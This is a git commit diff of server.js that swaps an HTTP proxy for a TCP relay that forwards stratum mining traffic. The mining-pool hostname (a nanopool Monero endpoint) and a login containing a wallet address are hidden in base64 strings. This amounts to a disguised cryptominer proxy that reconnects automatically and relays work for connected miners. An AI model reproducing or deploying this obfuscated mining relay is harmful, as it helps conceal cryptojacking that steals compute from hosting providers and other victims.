bfd27b96b06fc778093d99b74c917e56a5389b5f
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-01-23 01:26:16 +0600

    Update server.js

--- server.js
+++ server.js
@@ -1,61 +1,80 @@
-const { createProxyMiddleware } = require('http-proxy-middleware')
-const express = require('express')
-const request = require('request')
+const net = require('net')
 
-const app = express()
+let mMiner = null
+let mSocket = {}
+let mJob = null
+let mUser = 1
 
-let mCreate = {}
+let PORT = process.env.PORT || 9099
 
-let port = process.env.PORT
+net.createServer(function(socket) {
+    
+    mSocket[mUser] = socket
+    let key = mUser
 
-let startTime = new Date().toUTCString()
+    mUser++
 
+    console.log(Object.keys(mSocket))
 
-app.listen(port || 3000, ()=>{
-    console.log('Listening on port '+port+'/3000')
+    socketConnection(key, socket)
+
+}).listen(PORT, () => {  
+    console.log('Server PORT: '+PORT)
 })
 
-app.use('/', (req, res, next) => {
-    let url = req.url
-    try {
-        let http = 'http://'
-        if (url.startsWith('http://')) {
-            url = url.substring(7, url.length)
-        } else if (url.startsWith('https://')) {
-            http = 'https://'
-            url = url.substring(8, url.length)
-        }
-        url = url.substring(0, url.indexOf('/'))
 
-        if (url && url.length > 5) {
-            url = http+url
-        } else {
-            url = null
-        }
-    } catch (error) {}
+connectClient()
 
-    if (url) {
-        if (mCreate[url] == null) {
-            mCreate[url] = 'x'
-            app.use(createProxyMiddleware({ target: url, changeOrigin: true }))
-        }
+function connectClient() {
+    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
+        mMiner = client
+        mJob = null
+        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
+    }).on('data', (data) => {
+        try {
+            let result = data.toString()
+            if (mJob == null) {
+                mJob = result
+            }
+
+            for (let socket of Object.values(mSocket)) {
+                socket.write(result+'\r\n')
+            }
+        } catch (error) {}
+    }).on('end', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(() => {
+            connectClient()
+        }, 2000)
+    }).on('error', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(() => {
+            connectClient()
+        }, 2000)
+    })
+}
+
+function socketConnection(key, socket) {
+    if (mJob) {
+        socket.write(mJob+'\r\n')
     }
-    next()
-})
 
+    socket.on('data', function(data) {
+        let result = data.toString()
+        if (mMiner) {
+            mMiner.write(result+'\r\n')
+        }
 
-app.get('/', async function (req, res) {
-    res.end(startTime)
-})
-
-app.get('/ip', async function (req, res) {
-    request({
-        url: 'https://ifconfig.me/ip'
-    }, function (error, response, body) {
-        if (!error) {
-            res.end(body)
-        } else {
-            res.end('Error')
+        try {
+            console.log(JSON.parse(result))
+        } catch (error) {
+            console.log(result)
         }
     })
-})
+
+    socket.on('error', () => {
+        delete mSocket[key]
+    })
+}
